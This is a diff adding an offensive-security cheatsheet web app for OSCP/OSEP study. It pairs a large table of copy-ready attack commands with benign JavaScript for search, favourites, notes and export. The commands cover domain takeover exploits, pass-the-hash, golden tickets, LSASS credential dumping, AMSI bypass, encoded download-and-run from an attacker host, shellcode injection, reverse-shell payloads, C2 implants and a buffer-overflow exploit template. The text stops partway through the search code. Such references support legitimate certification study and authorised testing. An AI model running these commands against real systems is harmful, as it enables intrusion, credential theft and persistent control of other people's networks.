+["NoPac instant DA","python3 noPac.py {DOMAIN}/{USER}:'{PASS}' -dc-ip {DC} -dc-host dc01 -shell --impersonate administrator",["crit"]],
+["Certipy find vulns","certipy find -u {USER}@{DOMAIN} -p '{PASS}' -dc-ip {DC} -vulnerable -stdout"],
+["Certipy ESC1","certipy req -u {USER}@{DOMAIN} -p '{PASS}' -dc-ip {DC} -target ca01.{DOMAIN} -template UserCert -upn administrator@{DOMAIN}"],
+["Certipy auth","certipy auth -pfx administrator.pfx -domain {DOMAIN} -dc-ip {DC}"],
+["WriteDACL → DCSync","Add-DomainObjectAcl -TargetIdentity 'DC=corp,DC=local' -PrincipalIdentity {USER} -Rights DCSync"],
+["GenericAll → password change","Set-DomainUserPassword -Identity TARGET -AccountPassword (ConvertTo-SecureString 'NewPass@123' -AsPlainText -Force)"],
+["Coerce — PetitPotam","python3 PetitPotam.py -u {USER} -p '{PASS}' -d {DOMAIN} {LHOST} {DC}",["new"]],
+["Coerce — Coercer all methods","coercer coerce -t {DC} -l {LHOST} -u {USER} -p '{PASS}' -d {DOMAIN}",["new"]],
+]},
+]},
+{id:"adlat",label:"AD Lateral",icon:"↔",group:"Active Directory",groups:[
+{t:"Pass-the-Hash",c:[
+["CME bulk PtH","crackmapexec smb 192.168.1.0/24 -u {USER} -H :{HASH} --local-auth"],
+["psexec PtH","impacket-psexec {DOMAIN}/{USER}@{RHOST} -hashes :{HASH}"],
+["wmiexec PtH","impacket-wmiexec {DOMAIN}/{USER}@{RHOST} -hashes :{HASH}"],
+["evil-winrm hash","evil-winrm -i {RHOST} -u {USER} -H {HASH}"],
+["xfreerdp PtH","xfreerdp /v:{RHOST} /u:{USER} /pth:{HASH} /cert-ignore"],
+]},
+{t:"Kerberos",c:[
+["Overpass-the-hash","impacket-getTGT {DOMAIN}/{USER} -hashes :{HASH}\nexport KRB5CCNAME={USER}.ccache"],
+["psexec Kerberos","impacket-psexec {DOMAIN}/{USER}@dc01.{DOMAIN} -k -no-pass"],
+["Rubeus PtT","Rubeus.exe ptt /ticket:BASE64_TICKET"],
+["Golden Ticket (Linux)","impacket-ticketer -nthash KRBTGT_HASH -domain-sid DOMAIN_SID -domain {DOMAIN} -duration 3650 FakeAdmin\nexport KRB5CCNAME=FakeAdmin.ccache"],
+["Golden Ticket (Windows)","kerberos::golden /user:FakeAdmin /domain:{DOMAIN} /sid:DOMAIN_SID /krbtgt:KRBTGT_HASH /ticket:golden.kirbi\nkerberos::ptt golden.kirbi"],
+["Diamond Ticket","Rubeus.exe diamond /tgtdeleg /ticketuser:{USER} /groups:512 /krbkey:AES256_KRBTGT /nowrap"],
+]},
+{t:"Credential Dumping",c:[
+["LSASS dump (comsvcs — no tools!)","tasklist /fi 'imagename eq lsass.exe'\nrundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump LSASS_PID C:\\Temp\\lsass.dmp full"],
+["pypykatz parse (Linux)","pypykatz lsa minidump lsass.dmp"],
+["Mimikatz","privilege::debug\nsekurlsa::logonpasswords"],
+]},
+]},
+{id:"adpst",label:"Persistence",icon:"🔒",group:"Active Directory",groups:[
+{t:"AD Backdoors",c:[
+["AdminSDHolder","Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=corp,DC=local' -PrincipalIdentity {USER} -Rights All"],
+["DSRM enable network","New-ItemProperty 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\' -Name 'DsrmAdminLogonBehavior' -Value 2 -PropertyType DWORD -Force"],
+["Skeleton Key","privilege::debug\nmisc::skeleton"],
+["Custom SSP (password log)","privilege::debug\nmisc::memssp\n# Logs to C:\\Windows\\System32\\mimilsa.log"],
+["Silver Ticket CIFS","kerberos::golden /user:Administrator /domain:{DOMAIN} /sid:DOMAIN_SID /target:{RHOST} /service:cifs /rc4:SVC_HASH /ticket:silver.kirbi"],
+],},
+]},
+// ─── EVASION ────────────────────────────────────────────────
+{id:"evasion",label:"Evasion / OPSEC",icon:"👻",group:"OSEP Advanced",groups:[
+{t:"AMSI Bypass",c:[
+["AMSI bypass v1","$a='Am'+'si'+'Utils'\n$b=[Ref].Assembly.GetType('System.Management.Automation.'+$a)\n$c=$b.GetField('am'+'siInitFailed','NonPublic,Static')\n$c.SetValue($null,$true)"],
+["Verify bypass","[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').GetValue($null)  # should be True"],
+["Encoded exec","$cmd='IEX(New-Object Net.WebClient).DownloadString(\"http://{LHOST}/tool.ps1\")'\n$b=[Text.Encoding]::Unicode.GetBytes($cmd)\n$e=[Convert]::ToBase64String($b)\npowershell -enc $e -NoProfile -WindowStyle Hidden"],
+["ExecPolicy bypass","powershell -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -File script.ps1"],
+]},
+{t:"LOLBins",c:[
+["certutil download","certutil.exe -urlcache -split -f http://{LHOST}/file.exe C:\\Temp\\file.exe"],
+["certutil encode/decode","certutil -encode C:\\Temp\\lsass.dmp C:\\Temp\\out.txt  (exfil)\ncertutil -decode C:\\Temp\\out.txt C:\\Temp\\lsass.dmp  (decode)"],
+["mshta remote","mshta.exe http://{LHOST}/payload.hta"],
+["regsvr32 COM scriptlet","regsvr32 /s /n /u /i:http://{LHOST}/payload.sct scrobj.dll"],
+["wmic remote exec","wmic /node:{RHOST} /user:{USER} /password:{PASS} process call create 'cmd /c whoami'"],
+["installutil AppLocker bypass","C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\installutil.exe /logfile= /LogToConsole=false /U C:\\Temp\\payload.exe"],
+["LSASS dump (no tools!)","rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump LSASS_PID C:\\Temp\\lsass.dmp full"],
+]},
+]},
+{id:"inject",label:"Injection",icon:"💉",group:"OSEP Advanced",groups:[
+{t:"Shellcode Injection",c:[
+["PS VirtualAlloc","$code=@\"\n[DllImport(\"kernel32.dll\")] public static extern IntPtr VirtualAlloc(IntPtr a,uint b,uint c,uint d);\n[DllImport(\"kernel32.dll\")] public static extern IntPtr CreateThread(IntPtr a,uint b,IntPtr c,IntPtr d,uint e,IntPtr f);\n\"@\n$t=Add-Type -MemberDefinition $code -Name Win32 -Namespace Win32 -PassThru\n[Byte[]]$buf=YOUR_SHELLCODE_BYTES\n$addr=$t::VirtualAlloc(0,$buf.Length+1,0x3000,0x40)\n[Runtime.InteropServices.Marshal]::Copy($buf,0,$addr,$buf.Length)\n$t::CreateThread(0,0,$addr,0,0,0)|Out-Null",["osep"]],
+["Msfvenom raw shellcode","msfvenom -p windows/x64/shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f ps1 -o shellcode.ps1"],
+["Donut PE→shellcode","donut -i payload.exe -o shellcode.bin -a 2 -b 2",["osep"]],
+]},
+{t:"Process Injection",c:[
+["Reflective PE inject","$bytes=[IO.File]::ReadAllBytes('C:\\Temp\\payload.dll')\nInvoke-ReflectivePEInjection -PEBytes $bytes -ProcId TARGET_PID",["osep"]],
+["Process hollowing steps","# 1. CreateProcess('svchost.exe', CREATE_SUSPENDED)\n# 2. NtUnmapViewOfSection (hollow)\n# 3. VirtualAllocEx + WriteProcessMemory\n# 4. SetThreadContext (update RIP)\n# 5. ResumeThread",["osep"]],
+["Early Bird APC","# 1. CreateProcess(SUSPENDED)\n# 2. VirtualAllocEx + WriteProcessMemory (shellcode)\n# 3. QueueUserAPC(shellcode_addr, thread)\n# 4. ResumeThread",["osep"]],
+]},
+]},
+// ─── C2 ────────────────────────────────────────────────────
+{id:"c2",label:"C2 Frameworks",icon:"📡",group:"OSEP Advanced",groups:[
+{t:"Metasploit",c:[
+["Shell handler","msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD windows/x64/shell_reverse_tcp; set LHOST {LHOST}; set LPORT {LPORT}; run -j'"],
+["Meterpreter handler","msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter_reverse_tcp; set LHOST {LHOST}; set LPORT {LPORT}; run -j'"],
+["Useful post modules","run post/multi/recon/local_exploit_suggester\nrun post/windows/gather/credentials/credential_collector\nrun post/multi/gather/env"],
+["SOCKS proxy","use auxiliary/server/socks_proxy\nset SRVPORT 1080\nset VERSION 5\nrun -j"],
+]},
+{t:"Sliver C2",c:[
+["Server start","sliver-server"],
+["Generate HTTPS implant","generate --http {LHOST} --os windows --arch amd64 --format exe --save implant.exe"],
+["Beacon (60s jitter 30%)","generate beacon --http {LHOST} --os windows --arch amd64 --seconds 60 --jitter 30 --save beacon.exe"],
+["HTTPS listener","https -L 0.0.0.0 -l 443"],
+["Execute assembly","execute-assembly /local/SharpHound.exe -c All"],
+["SOCKS5","socks5 start -P 1080"],
+]},
+]},
+// ─── TUNNELING ────────────────────────────────────────────
+{id:"tunnel",label:"Tunneling",icon:"🕳",group:"OSCP+ Core",groups:[
+{t:"SSH Tunneling",c:[
+["Local port forward","ssh -L {LPORT}:INTERNAL_IP:INTERNAL_PORT {USER}@{RHOST} -N"],
+["Remote port forward","ssh -R {RPORT}:127.0.0.1:{LPORT} {USER}@{RHOST} -N"],
+["Dynamic SOCKS5","ssh -D 1080 {USER}@{RHOST} -N"],
+["Double hop","ssh -J {USER}@{RHOST} {USER}@INTERNAL_HOST"],
+]},
+{t:"Chisel",c:[
+["Server (attacker)","./chisel server -p 8080 --reverse"],
+["SOCKS (target)","./chisel client {LHOST}:8080 R:socks"],
+["Port forward","./chisel client {LHOST}:8080 R:{LPORT}:127.0.0.1:{RPORT}"],
+]},
+{t:"Ligolo-ng",c:[
+["Server","./proxy -selfcert -laddr 0.0.0.0:11601"],
+["Agent","./agent -connect {LHOST}:11601 -ignore-cert"],
+["Add route","sudo ip route add 192.168.2.0/24 dev ligolo"],
+]},
+{t:"Proxychains",c:[
+["Config","echo 'socks5 127.0.0.1 1080' >> /etc/proxychains4.conf"],
+["Nmap via proxychains","proxychains nmap -sT -Pn -p 22,80,443,445 192.168.2.10"],
+["Impacket via proxychains","proxychains impacket-psexec {DOMAIN}/{USER}@192.168.2.10 -hashes :{HASH}"],
+]},
+]},
+// ─── FILE TRANSFER ───────────────────────────────────────
+{id:"transfer",label:"File Transfer",icon:"📦",group:"OSCP+ Core",groups:[
+{t:"Serve",c:[
+["Python3 HTTP","python3 -m http.server 80"],
+["Impacket SMB","impacket-smbserver share $(pwd) -smb2support"],
+["SMB with auth","impacket-smbserver share $(pwd) -smb2support -username {USER} -password {PASS}"],
+]},
+{t:"Windows Download",c:[
+["PowerShell WebClient","(New-Object Net.WebClient).DownloadFile('http://{LHOST}/file.exe','C:\\Temp\\file.exe')"],
+["Invoke-WebRequest","Invoke-WebRequest -Uri 'http://{LHOST}/file.exe' -OutFile 'C:\\Temp\\file.exe'"],
+["certutil","certutil.exe -urlcache -split -f http://{LHOST}/file.exe C:\\Temp\\file.exe"],
+["curl (Win10+)","curl -o C:\\Temp\\file.exe http://{LHOST}/file.exe"],
+["SMB copy","copy \\\\{LHOST}\\share\\file.exe C:\\Temp\\file.exe"],
+]},
+{t:"Linux Download",c:[
+["wget","wget http://{LHOST}/file -O /tmp/file"],
+["curl","curl http://{LHOST}/file -o /tmp/file"],
+["Base64 (no tools)","# Attacker: base64 -w0 file.exe\n# Target: echo 'BASE64' | base64 -d > /tmp/file && chmod +x /tmp/file"],
+]},
+]},
+// ─── HASH CRACKING ──────────────────────────────────────
+{id:"crack",label:"Hash Cracking",icon:"🔓",group:"Post-Exploitation",groups:[
+{t:"Hashcat Modes",c:[
+["NTLM (1000)","hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt"],
+["NTLMv2 (5600)","hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt"],
+["Kerberoast RC4 (13100)","hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule"],
+["ASREPRoast (18200)","hashcat -m 18200 hashes.txt /usr/share/wordlists/rockyou.txt"],
+["MD5 (0)","hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt"],
+["SHA1 (100)","hashcat -m 100 hashes.txt /usr/share/wordlists/rockyou.txt"],
+["bcrypt (3200)","hashcat -m 3200 hashes.txt /usr/share/wordlists/rockyou.txt"],
+["WPA2 (22000)","hashcat -m 22000 capture.hccapx /usr/share/wordlists/rockyou.txt"],
+]},
+{t:"Hashcat Strategies",c:[
+["Dict + rules (BEST)","hashcat -m 1000 hashes.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule"],
+["Hybrid list+mask","hashcat -m 1000 hashes.txt -a 6 rockyou.txt ?d?d?d?d"],
+["Mask 8-char","hashcat -m 1000 hashes.txt -a 3 ?a?a?a?a?a?a?a?a"],
+["CeWL + crack","cewl {URL} -w company.txt && hashcat -m 1000 hashes.txt company.txt -r /usr/share/hashcat/rules/best64.rule"],
+["Show cracked","hashcat -m 1000 hashes.txt --show"],
+]},
+{t:"John the Ripper",c:[
+["John auto","john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt"],
+["Show cracked","john hashes.txt --show"],
+["ZIP crack","zip2john archive.zip > zip.hash && john zip.hash --wordlist=rockyou.txt"],
+["SSH key crack","ssh2john id_rsa > ssh.hash && john ssh.hash --wordlist=rockyou.txt"],
+]},
+]},
+// ─── BUFFER OVERFLOW ─────────────────────────────────────
+{id:"bof",label:"Buffer Overflow",icon:"💥",group:"OSCP+ Core",groups:[
+{t:"Fuzzing",c:[
+["Pattern create","msf-pattern_create -l 3000"],
+["Pattern offset","msf-pattern_offset -q DEADBEEF"],
+["Python3 fuzzer","python3 -c \"import socket; s=socket.socket(); s.connect(('{RHOST}',9999)); s.send(b'OVERFLOW1 ' + b'A'*2000); s.close()\""],
+["EIP control test","python3 -c \"print('A'*OFFSET + 'B'*4 + 'C'*500)\""],
+]},
+{t:"Badchars & JMP ESP",c:[
+["Mona bytearray","!mona bytearray -b '\\x00'"],
+["Mona compare","!mona compare -f C:\\mona\\BOF\\bytearray.bin -a ESP_ADDR"],
+["Mona find JMP ESP","!mona jmp -r esp -cpb '\\x00\\x0a\\x0d'"],
+["JMP ESP opcode","# FFE4 = JMP ESP"],
+]},
+{t:"Shellcode",c:[
+["Msfvenom (no badchars)","msfvenom -p windows/shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} EXITFUNC=thread -b '\\x00' -f py"],
+["BoF exploit template","import socket\nip='{RHOST}'; port=9999\nprefix=b'OVERFLOW1 '; offset=b'A'*OFFSET_NUM\nretn=b'\\xXX\\xXX\\xXX\\xXX'  # JMP ESP little endian\nnop=b'\\x90'*16; buf=b''  # paste msfvenom here\ns=socket.socket(); s.connect((ip,port))\ns.send(prefix+offset+retn+nop+buf); s.close()"],
+]},
+]},
+// ─── MISC ──────────────────────────────────────────────
+{id:"misc",label:"Misc / Reference",icon:"📋",group:"Post-Exploitation",groups:[
+{t:"Quick Wins",c:[
+["Linux network","ip a && ip route && ss -tulnp"],
+["Windows network","ipconfig /all && netstat -ano"],
+["Linux find passwords","grep -r 'password\\|passwd\\|secret' /etc /home /var/www 2>/dev/null | grep -v Binary"],
+["Windows find passwords","findstr /si password *.txt *.xml *.config *.ini 2>nul"],
+["Port check (bash)","for p in 21 22 80 443 445 3389 8080; do (echo>/dev/tcp/{RHOST}/$p) 2>/dev/null && echo \"Port $p open\"; done"],
+]},
+{t:"Wordlists",c:[
+["Rockyou","/usr/share/wordlists/rockyou.txt"],
+["SecLists dirs","/usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt"],
+["SecLists usernames","/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt"],
+["Hashcat rules best64","/usr/share/hashcat/rules/best64.rule"],
+["Install SecLists","sudo apt install seclists"],
+]},
+]},
+];
+
+// ═══════════════════════════════════════════════════════════
+// STATE
+// ═══════════════════════════════════════════════════════════
+let favorites = JSON.parse(localStorage.getItem('cs_favs') || '{}');
+let notes = JSON.parse(localStorage.getItem('cs_notes') || '{}');
+let copyHistory = JSON.parse(localStorage.getItem('cs_hist') || '[]');
+let doneItems = JSON.parse(localStorage.getItem('cs_done') || '{}');
+let activeNotes = {};
+
+function gv() {
+  return {
+    LHOST: document.getElementById('lhost').value,
+    RHOST: document.getElementById('rhost').value,
+    LPORT: document.getElementById('lport').value,
+    RPORT: document.getElementById('rport').value,
+    DOMAIN: document.getElementById('domain').value,
+    DC: document.getElementById('dc').value,
+    USER: document.getElementById('user').value,
+    PASS: document.getElementById('pass').value,
+    HASH: document.getElementById('hash').value,
+    URL: document.getElementById('url').value,
+  };
+}
+
+function sub(s) {
+  const v = gv();
+  return s.replace(/\{(\w+)\}/g, (m, k) => v[k] !== undefined ? v[k] : m);
+}
+
+function escHtml(s) {
+  return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+}
+
+function mkId(secId, gi, ci) { return `c_${secId}_${gi}_${ci}`; }
+
+function renderTags(tags) {
+  if (!tags || !tags.length) return '';
+  return tags.map(t => {
+    if (t === 'crit') return '<span class="tag tag-crit">CRITICAL</span>';
+    if (t === 'high') return '<span class="tag tag-high">HIGH</span>';
+    if (t === 'med') return '<span class="tag tag-med">MEDIUM</span>';
+    if (t === 'osep') return '<span class="tag tag-osep">OSEP</span>';
+    if (t === 'new') return '<span class="tag tag-new">NEW</span>';
+    return '';
+  }).join('');
+}
+
+function renderRow(cmd, secId, gi, ci) {
+  const [desc, raw, tags] = [cmd[0], cmd[1], cmd[2] || []];
+  const id = mkId(secId, gi, ci);
+  const isFav = favorites[id] || false;
+  const hasNote = notes[id] && notes[id].trim();
+  const isDone = doneItems[id] || false;
+  return `<div class="row${isFav ? ' fav-row' : ''}${isDone ? ' done-row' : ''}" id="row_${id}">
+    <div class="ri">
+      <div class="rd">${escHtml(desc)} ${renderTags(tags)}</div>
+      <div class="rc" id="${id}">${escHtml(sub(raw))}</div>
+      ${hasNote ? `<div class="note-display">📝 ${escHtml(notes[id])}</div>` : ''}
+      ${activeNotes[id] ? `<textarea class="note-area" id="note_${id}" placeholder="Add your note..." onblur="saveNote('${id}')">${notes[id] || ''}</textarea>` : ''}
+    </div>
+    <div class="row-actions">
+      <button class="cp" onclick="doCopy(this,'${id}')">Copy</button>
+      <button class="fav-btn${isFav ? ' on' : ''}" onclick="toggleFavItem('${id}','${escHtml(desc)}',this)" title="Favorite">★</button>
+      <button class="note-btn${hasNote ? ' has-note' : ''}" onclick="toggleNote('${id}')" title="Note">📝</button>
+      <button class="done-btn${isDone ? ' on' : ''}" onclick="toggleDone('${id}')" title="Mark done">✔</button>
+    </div>
+  </div>`;
+}
+
+function buildSidebar() {
+  const sb = document.getElementById('sidebar');
+  const groups = {};
+  D.forEach(s => { if (!groups[s.group]) groups[s.group] = []; groups[s.group].push(s); });
+  let h = '';
+  Object.entries(groups).forEach(([g, items]) => {
+    h += `<div class="sg">${g}</div>`;
+    items.forEach(s => {
+      const total = s.groups.reduce((a, g) => a + g.c.length, 0);
+      h += `<div class="si${D[0].id === s.id ? ' on' : ''}" data-id="${s.id}">${s.icon || ''} ${s.label} <span class="cnt">${total}</span></div>`;
+    });
+  });
+  sb.innerHTML = h;
+  sb.querySelectorAll('.si').forEach(el => {
+    el.onclick = () => {
+      document.querySelectorAll('.si').forEach(x => x.classList.remove('on'));
+      document.querySelectorAll('.sec').forEach(x => x.classList.remove('on'));
+      el.classList.add('on');
+      document.getElementById('s-' + el.dataset.id).classList.add('on');
+      document.getElementById('searchResults').classList.remove('on');
+      document.getElementById('searchInput').value = '';
+    };
+  });
+}
+
+function buildSections() {
+  const cont = document.getElementById('sections');
+  let html = '';
+  D.forEach((s, si) => {
+    const totalCmds = s.groups.reduce((a,g)=>a+g.c.length,0);
+    html += `<div id="s-${s.id}" class="sec${si === 0 ? ' on' : ''}">`;
+    html += `<div class="sec-hdr">
+      <div class="sec-title">${s.icon || ''} ${s.label}</div>
+      <span style="font-size:11px;color:var(--text3)">${totalCmds} commands</span>
+      <button class="sec-export" onclick="exportSection('${s.id}')" title="Export section as text">⬇ Export</button>
+    </div>`;
+    s.groups.forEach((g, gi) => {
+      const grpId = `grp_${s.id}_${gi}`;
+      html += `<div class="grp" id="${grpId}">
+        <div class="grp-title" onclick="toggleGrp('${grpId}')">
+          ${g.t} <span style="color:var(--text3);font-weight:400;text-transform:none;letter-spacing:0">(${g.c.length})</span>
+          <span class="collapse-icon">▾</span>
+        </div>
+        <div class="grp-progress"><div class="grp-progress-bar" id="prg_${grpId}"></div></div>
+        <div class="grp-body" id="body_${grpId}">`;
+      g.c.forEach((cmd, ci) => { html += renderRow(cmd, s.id, gi, ci); });
+      html += '</div></div>';
+    });
+    html += '</div>';
+  });
+  cont.innerHTML = html;
+  updateAllProgressBars();
+}
+
+function refreshSection(secId) {
+  const secData = D.find(x => x.id === secId);
+  if (!secData) return;
+  const el = document.getElementById('s-' + secId);
+  if (!el) return;
+  let html = `<div class="sec-hdr"><div class="sec-title">${secData.icon || ''} ${secData.label}</div></div>`;
+  secData.groups.forEach((g, gi) => {
+    html += `<div class="grp"><div class="grp-title">${g.t} <span style="color:var(--text3);font-weight:400;text-transform:none;letter-spacing:0">(${g.c.length})</span></div>`;
+    g.c.forEach((cmd, ci) => { html += renderRow(cmd, secId, gi, ci); });
+    html += '</div>';
+  });
+  el.innerHTML = html;
+}
+
+function doCopy(btn, id) {
+  const txt = document.getElementById(id).textContent;
+  const copy = t => { try { navigator.clipboard.writeText(t); } catch(e) { const ta = document.createElement('textarea'); ta.value = t; document.body.appendChild(ta); ta.select(); document.execCommand('copy'); document.body.removeChild(ta); } };
+  copy(txt);
+  btn.textContent = 'Done!';
+  btn.classList.add('ok');
+  setTimeout(() => { btn.textContent = 'Copy'; btn.classList.remove('ok'); }, 1600);
+  // Add to history
+  const ts = new Date().toLocaleTimeString();
+  copyHistory.unshift({ t: ts, c: txt.slice(0, 120) + (txt.length > 120 ? '...' : '') });
+  if (copyHistory.length > 20) copyHistory.pop();
+  localStorage.setItem('cs_hist', JSON.stringify(copyHistory));
+  renderHistory();
+}
+
+function toggleFavItem(id, desc, btn) {
+  favorites[id] = !favorites[id];
+  if (!favorites[id]) delete favorites[id];
+  localStorage.setItem('cs_favs', JSON.stringify(favorites));
+  btn.classList.toggle('on');
+  const row = document.getElementById('row_' + id);
+  if (row) row.classList.toggle('fav-row', !!favorites[id]);
+  updateFavCount();
+  renderFavList();
+}
+
+function updateFavCount() {
+  document.getElementById('favCount').textContent = Object.keys(favorites).length;
+}
+
+function toggleFav() {
+  const p = document.getElementById('favPanel');
+  p.classList.toggle('on');
+  if (p.classList.contains('on')) renderFavList();
+}
+
+function renderFavList() {
+  const fl = document.getElementById('favList');
+  const keys = Object.keys(favorites);
+  if (!keys.length) { fl.innerHTML = '<div class="empty"><div class="empty-icon">⭐</div>No favorites yet.</div>'; return; }
+  let h = '';
+  keys.forEach(id => {
+    const parts = id.replace('c_','').split('_');
+    const secId = parts[0]; const gi = parseInt(parts[1]); const ci = parseInt(parts[2]);
+    const sec = D.find(x => x.id === secId);
+    if (!sec || !sec.groups[gi] || !sec.groups[gi].c[ci]) return;
+    const cmd = sec.groups[gi].c[ci];
+    h += `<div class="row fav-row" style="margin-bottom:6px">
+      <div class="ri">
+        <div class="rd">${escHtml(cmd[0])} <span style="color:var(--text3);font-size:10px">${sec.label}</span></div>
+        <div class="rc">${escHtml(sub(cmd[1]))}</div>
+      </div>
+      <div class="row-actions">
+        <button class="cp" onclick="doCopy(this,'fav_c_${id}');document.getElementById('fav_c_${id}').textContent=document.getElementById('${id}').textContent" style="display:none">-</button>
+        <button class="cp" onclick="copyText('${id}')">Copy</button>
+        <button class="fav-btn on" onclick="removeFav('${id}')">★</button>
+      </div>
+    </div>`;
+  });
+  fl.innerHTML = h;
+}
+
+function copyText(id) {
+  const el = document.getElementById(id);
+  if (!el) return;
+  try { navigator.clipboard.writeText(el.textContent); } catch(e) {}
+}
+
+function removeFav(id) {
+  delete favorites[id];
+  localStorage.setItem('cs_favs', JSON.stringify(favorites));
+  const btn = document.querySelector(`[onclick*="toggleFavItem('${id}'"]`);
+  if (btn) { btn.classList.remove('on'); const row = document.getElementById('row_'+id); if(row) row.classList.remove('fav-row'); }
+  updateFavCount();
+  renderFavList();
+}
+
+function clearAllFavs() {
+  favorites = {};
+  localStorage.setItem('cs_favs', JSON.stringify(favorites));
+  document.querySelectorAll('.fav-btn.on').forEach(b => b.classList.remove('on'));
+  document.querySelectorAll('.fav-row').forEach(r => r.classList.remove('fav-row'));
+  updateFavCount();
+  renderFavList();
+}
+
+function toggleNote(id) {
+  if (activeNotes[id]) {
+    delete activeNotes[id];
+  } else {
+    activeNotes[id] = true;
+  }
+  // Re-render just that row
+  D.forEach(s => {
+    s.groups.forEach((g, gi) => {
+      g.c.forEach((cmd, ci) => {
+        const rid = mkId(s.id, gi, ci);
+        if (rid === id) {
+          const row = document.getElementById('row_' + id);
+          if (row) row.outerHTML = renderRow(cmd, s.id, gi, ci);
+          if (activeNotes[id]) {
+            setTimeout(() => { const ta = document.getElementById('note_' + id); if(ta) ta.focus(); }, 50);
+          }
+        }
+      });
+    });
+  });
+}
+
+function saveNote(id) {
+  const ta = document.getElementById('note_' + id);
+  if (!ta) return;
+  const val = ta.value.trim();
+  if (val) notes[id] = val; else delete notes[id];
+  localStorage.setItem('cs_notes', JSON.stringify(notes));
+  delete activeNotes[id];
+  D.forEach(s => {
+    s.groups.forEach((g, gi) => {
+      g.c.forEach((cmd, ci) => {
+        if (mkId(s.id, gi, ci) === id) {
+          const row = document.getElementById('row_' + id);
+          if (row) row.outerHTML = renderRow(cmd, s.id, gi, ci);
+        }
+      });
+    });
+  });
+}
+
+function toggleHistory() {
+  const p = document.getElementById('histPanel');
+  p.style.display = p.style.display === 'none' ? 'block' : 'none';
+}
+
+function toggleShortcuts() {
+  document.getElementById('shortcutPanel').classList.toggle('on');
+}
+
+// ─── DONE / CHECKLIST ────────────────────────────────────
+function toggleDone(id) {
+  const row = document.getElementById('row_' + id);
+  const btn = row?.querySelector('.done-btn');
+  if (doneItems[id]) {
+    delete doneItems[id];
+    row?.classList.remove('done-row');
+    btn?.classList.remove('on');
+  } else {
+    doneItems[id] = true;
+    row?.classList.add('done-row');
+    btn?.classList.add('on');
+  }
+  localStorage.setItem('cs_done', JSON.stringify(doneItems));
+  updateAllProgressBars();
+}
+
+// ─── COLLAPSIBLE GROUPS ──────────────────────────────────
+function toggleGrp(grpId) {
+  const title = document.querySelector(`#${grpId} .grp-title`);
+  const body = document.getElementById('body_' + grpId);
+  if (!body) return;
+  const collapsed = body.classList.toggle('collapsed');
+  title?.classList.toggle('collapsed', collapsed);
+}
+
+// ─── PROGRESS BARS ───────────────────────────────────────
+function updateAllProgressBars() {
+  D.forEach((s, si) => {
+    s.groups.forEach((g, gi) => {
+      const grpId = `grp_${s.id}_${gi}`;
+      const bar = document.getElementById('prg_' + grpId);
+      if (!bar) return;
+      const total = g.c.length;
+      const done = g.c.filter((_, ci) => doneItems[mkId(s.id, gi, ci)]).length;
+      bar.style.width = total ? (done / total * 100) + '%' : '0%';
+    });
+  });
+  // Update sidebar stats
+  const totalDone = Object.keys(doneItems).length;
+  const totalCmds = D.reduce((a, s) => a + s.groups.reduce((b, g) => b + g.c.length, 0), 0);
+  const el = document.getElementById('globalProgress');
+  if (el) el.textContent = `✔ ${totalDone}/${totalCmds}`;
+}
+
+// ─── EXPORT SECTION ──────────────────────────────────────
+function exportSection(secId) {
+  const s = D.find(x => x.id === secId);
+  if (!s) return;
+  const v = gv();
+  let txt = `# ${s.label} — OSCP/OSEP Cheatsheet\n# Exported: ${new Date().toLocaleString()}\n\n`;
+  s.groups.forEach(g => {
+    txt += `\n## ${g.t}\n`;
+    g.c.forEach(cmd => {
+      txt += `\n### ${cmd[0]}\n${sub(cmd[1])}\n`;
+    });
+  });
+  const blob = new Blob([txt], {type:'text/plain'});
+  const a = document.createElement('a'); a.href = URL.createObjectURL(blob);
+  a.download = `${secId}_${new Date().toISOString().slice(0,10)}.txt`;
+  a.click();
+}
+
+function renderHistory() {
+  const hl = document.getElementById('histList');
+  if (!copyHistory.length) { hl.innerHTML = '<div style="color:var(--text3);font-size:11px">No history yet.</div>'; return; }
+  hl.innerHTML = copyHistory.map(h => `<div class="hist-item"><span class="hist-time">${h.t}</span><span style="flex:1;font-size:11px;color:var(--code)">${escHtml(h.c)}</span></div>`).join('');
+}
+
+function clearHistory() {
+  copyHistory = [];
+  localStorage.setItem('cs_hist', JSON.stringify(copyHistory));
+  renderHistory();
+}
+
+function exportFavs() {
+  const keys = Object.keys(favorites);
+  if (!keys.length) { alert('No favorites to export!'); return; }
+  let txt = '# OSCP/OSEP Cheatsheet — Exported Favorites\n# Generated: ' + new Date().toLocaleString() + '\n\n';
+  const v = gv();
+  txt += '# Variables:\n';
+  Object.entries(v).forEach(([k,val]) => { txt += `# ${k} = ${val}\n`; });
+  txt += '\n';
+  keys.forEach(id => {
+    const parts = id.replace('c_','').split('_');
+    const sec = D.find(x => x.id === parts[0]);
+    if (!sec) return;
+    const cmd = sec.groups[parseInt(parts[1])]?.c[parseInt(parts[2])];
+    if (!cmd) return;
+    txt += `\n## [${sec.label}] ${cmd[0]}\n`;
+    txt += sub(cmd[1]) + '\n';
+    if (notes[id]) txt += `# Note: ${notes[id]}\n`;
+  });
+  const blob = new Blob([txt], {type:'text/plain'});
+  const a = document.createElement('a'); a.href = URL.createObjectURL(blob);
+  a.download = 'favorites_' + new Date().toISOString().slice(0,10) + '.txt';
+  a.click();
+}
+
+// ─── SEARCH ──────────────────────────────────────────────
+let searchTimeout;
+document.getElementById('searchInput').addEventListener('input', function() {
+  clearTimeout(searchTimeout);
